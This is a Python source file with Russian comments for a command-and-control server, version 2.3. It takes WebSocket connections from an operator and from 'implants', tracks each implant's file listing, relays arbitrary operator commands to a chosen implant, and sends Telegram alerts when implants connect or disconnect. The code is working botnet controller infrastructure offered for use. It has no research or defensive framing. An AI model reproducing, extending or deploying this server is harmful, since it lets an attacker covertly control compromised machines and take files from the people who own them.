#
# --- Файл: c2_server.py (Версия 2.3 - "Шунтирование") ---
# Исправляет паралич сервера из-за блокирующего вызова в Telegram.
# Отступы выверены.
#
import asyncio
import json
import os
import urllib.parse
import urllib.request
from aiohttp import web
import settings

# ==============================================================================
# УВЕДОМЛЕНИЯ В TELEGRAM (БЕЗ БЛОКИРОВКИ)
# ==============================================================================
def send_telegram_message(message, loop):
  """Отправляет сообщение в Telegram, не блокируя основной поток."""
  def send():
    # Эта функция содержит блокирующий сетевой код
    try:
      url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
      urllib.request.urlopen(url, timeout=10)
    except Exception as e:
      print(f"[!] Ошибка отправки в Telegram: {e}")

  # Запускаем блокирующий код в отдельном пуле потоков
  loop.run_in_executor(None, send)

# ==============================================================================
# ГЛОБАЛЬНОЕ СОСТОЯНИЕ
# ==============================================================================
IMPLANTS, OPERATOR = {}, None

# ==============================================================================
# ОСНОВНОЙ ОБРАБОТЧИК WEBSOCKET
# ==============================================================================
async def websocket_handler(request):
  global OPERATOR, IMPLANTS
  ws = web.WebSocketResponse()
  await ws.prepare(request)
  client_type, client_id = None, None

  loop = asyncio.get_running_loop()

  try:
    initial_msg = await ws.receive_json(timeout=15.0)
    client_type = initial_msg.get('type')

    if client_type == 'operator':
      OPERATOR = ws
      print("[+] Оператор подключился.")
      await broadcast_bot_list()
    elif client_type == 'implant':
      client_id = initial_msg.get('id')
      IMPLANTS[client_id] = {
        "ws": ws,
        "files": initial_msg.get('files', {}),
        "volume": initial_msg.get('current_volume', 50)
      }
      print(f"[+] Новый имплант онлайн: {client_id}")
      send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}", loop)
      await broadcast_bot_list()
    else:
      await ws.close()
      return ws

    async for msg in ws:
      if msg.type == web.WSMsgType.TEXT:
        if msg.data == 'ping':
          await ws.send_str('pong')
          continue

        data = json.loads(msg.data)

        if client_type == 'operator':
          target_id = data.get('target_id')
          if data['type'] == 'command' and target_id in IMPLANTS:
            await IMPLANTS[target_id]["ws"].send_json(data['payload'])
          elif data['type'] == 'get_details' and target_id in IMPLANTS:
            details = {
              "files": IMPLANTS[target_id].get("files"),
              "volume": IMPLANTS[target_id].get("volume")
            }
            await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

        elif client_type == 'implant':
          if data.get('type') == 'file_list_update':
            if client_id in IMPLANTS:
              IMPLANTS[client_id]["files"] = data.get('files', {})
              if OPERATOR:
                await broadcast_bot_list()
                await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

  except (asyncio.TimeoutError, json.JSONDecodeError):
    pass
  except Exception:
    pass
  finally:
    if client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] Имплант отключился: {client_id}")
      send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}", loop)
      await broadcast_bot_list()
    elif client_type == 'operator':
      OPERATOR = None
      print("[-] Оператор отключился.")
  return ws

# ==============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И ЗАПУСК
# ==============================================================================
async def broadcast_bot_list():
  if OPERATOR and not OPERATOR.closed:
    try:
      await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})
    except (ConnectionResetError, asyncio.CancelledError):
      pass

async def http_handler(request):
  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
  app = web.Application()
  app.router.add_get('/', http_handler)
  app.router.add_get('/ws', websocket_handler)
  runner = web.AppRunner(app)
  await runner.setup()
  port = int(os.environ.get("PORT", 10000))
  site = web.TCPSite(runner, '0.0.0.0', port)
  await site.start()
  print(f"====== C2 SERVER (V2.3) ONLINE on port {port} ======")
  send_telegram_message("🚀 Сервер 'Крепость' V2.3 запущен.", asyncio.get_running_loop())
  await asyncio.Event().wait()

if __name__ == "__main__":
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    print("\nСервер остановлен вручную.")
  finally:
    print("Сервер остановлен.")
